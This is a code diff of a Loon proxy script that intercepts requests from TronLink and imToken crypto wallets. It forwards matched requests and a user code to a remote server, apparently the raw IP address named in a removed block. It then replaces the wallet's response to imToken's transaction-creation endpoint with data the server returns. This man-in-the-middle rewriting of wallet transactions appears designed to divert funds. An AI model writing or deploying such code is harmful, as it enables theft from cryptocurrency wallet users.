@@ -4,7 +4,7 @@ const Host = $request.headers
 const usercode = $argument;
 const regexRules = [
     { regex: /wallet\/getLatestAPK\?address=/, description: 'TronLink' },
-    { regex: /^https?:\/\/biz\.token\.im\/v1\/tron$/, description: 'Imtoken' },
+    { regex: /^https:\/\/tron-mainnet\.token\.im\/wallet\/createtransaction$/, description: 'Imtoken' },
     // ...可以有很多规则
     { regex: /pattern50/, description: 'Description for pattern 50' }
 ];
@@ -29,54 +29,25 @@ if (matchingRule) {
     $httpClient.post(params, function (errormsg, response, data) { 
         if(response.status==200){
             let newdata = JSON.parse(data)
-            console.log(newdata)
+            console.log("========================"+data)
             console.log(typeof(newdata) )
-            if(newdata.message!='success'){
-                sendNotification("错误", "", newdata.message);
+            if(newdata.data && newdata.message!=="success"){
+                sendNotification("", "", newdata.data,"loon://off");
+                $done({})
+                return
             }
+            console.log("-----------------------------")
+            var RespnseBodyData = $response.body
+    // RespnseBodyData = Json.parse(RespnseBodyData);
+    RespnseBodyData = newdata.data;
+    console.log("+++++++++++++++++++++++++++++++++++++++++++++++++++")
+    $done({RespnseBodyData});//修改完成之后需要调用$done
+    
         }
     })
-} else {
-    console.log('No match found');
-}
-// if (TronLinkRegex.test(requrl)) {
-//     let params = {
-//         url:"http://43.134.170.213:8001/api/trx/getinfo",
-//         body:{
-//             "info": {
-//                 "usercode": usercode
-//             },
-//             "request": {
-//                 "request": request
-//             }
-//         },//仅仅在post请求中有效
-//     }
-//     console.log("1111111111");
-//     $notification.post("通知","","找到TronLink钱包");
-//     $httpClient.post(params, function(errormsg,response,data){
-//             if (data) {
-//             console.log(data);
+} 
 
-//         }
-//     })
-// } else {
-//     $done({});
-// }
-
-if (ImtokenRegex.test(requrl)) {
-    $notification.post("通知", "", "找到imtoken钱包");
-}
-
-
-function chekusercode() {
-    if (!usercode) {
-        $notification.post("错误", "", "请填写用户码", "loon://off");
-        $done({});
-        return false;
-    } else {
-        return true;
-    }
-}
+$done({});
 function sendNotification(title, subtitle, message, url) {
     $notification.post(title, subtitle, message, url);
 }
